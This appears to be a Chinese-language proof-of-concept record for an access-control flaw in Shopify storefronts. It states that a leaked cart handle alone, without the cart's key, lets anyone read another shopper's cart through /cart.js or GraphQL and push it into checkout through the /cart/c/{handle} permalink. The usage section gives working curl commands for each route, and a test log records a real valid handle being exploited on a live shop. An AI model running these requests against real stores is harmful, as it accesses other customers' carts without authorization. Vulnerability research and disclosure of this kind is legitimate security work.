# Shopify 购物车 permalink 路由 /cart/c/{handle} 同样不校验 ?key → 仅凭 handle 可把他车推进结账

- **code**: shopify-cart-permalink-key-not-enforced-3rd-surface
- **kind**: poc
- **category**: unauthorized
- **component**: Shopify Storefront（购物车 permalink /cart/c/{handle}）
- **severity**: low
- **language**: markdown
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-11 无 cookie/无 key 实测：GET /cart/c/ZZZZZZZZZZZZZZZZZZZZZZZZZ（随机 handle）→ HTTP 404；GET /cart/c/hWNJ1rrIeFg7ufCIGbjYiPU0（有效 handle，无 key 或带错 key）→ HTTP 302 到 https://shop.app/checkout/87370006865/cn/<新handle>/en-gb/shoppay?...&shop_pay_token=<已签名JWT>，其 ur_back_url 指回本店 /checkouts/cn/<handle>/en-gb?_r=...；匿名跟随拿到真实 Shopify 结账页(200,368731B)，页内嵌该车商品 gid://shopify/ProductVariant/53814901244241。结账页 email 表单为空、无 buyer PII 回显（同店 buyerIdentity.email 无 key 恒为 null）。
- **tags**: shopify,storefront,idor,unauthorized,cart,permalink
- **created_at**: 2026-11-11T16:06:31.985Z
- **engine**: https://collect.thegamecollection.net

## 描述

Shopify 店读路径不校验 Cart GID 的 ?key 访问分量，除 GraphQL cart(id:)/node(id:) 与 Ajax /cart.js 外，购物车 permalink GET /cart/c/{handle} 也不校验：随机 handle 返回 404（handle 必须存在），有效 handle 不传 key（或传错 key）即 302 进入结账流并生成该车的 checkout + 已签名 shop_pay_token。影响与 Read-IDOR 同天花板：只读他车内容/推进结账，无写、无 PII（email/phone 受 key 门禁）。

## 用法

```
前置：目标为 Shopify 托管店，已获得某购物车 25 位 handle（不可枚举，需从共享链接/Referer/日志泄漏）。\n\n读车第二/第三入口：\ncurl -sk 'https://<shop>/cart.js' -H 'Cookie: cart=<25位handle>'            # 裸 handle 去 key\ncurl -sk 'https://<shop>/api/graphql' -H 'Content-Type: application/json' \\n  --data '{"query":"{ node(id:\"gid://shopify/Cart/<handle>\"){ id ... on Cart { totalQuantity } } }"}'\n\npermalink 推进结账（不校验 key）：\ncurl -sk -o /dev/null -w '%{http_code} %{redirect_url}\\n' 'https://<shop>/cart/c/<handle>'   # → 302 shop.app/checkout/...\n# 对照：随机 handle → 404\n\n判据：有效 handle 无 key/错 key 均命中同一车（cart:null 才是正确校验）；写 mutation 无 key 应仍报 'The specified cart does not exist.'
```
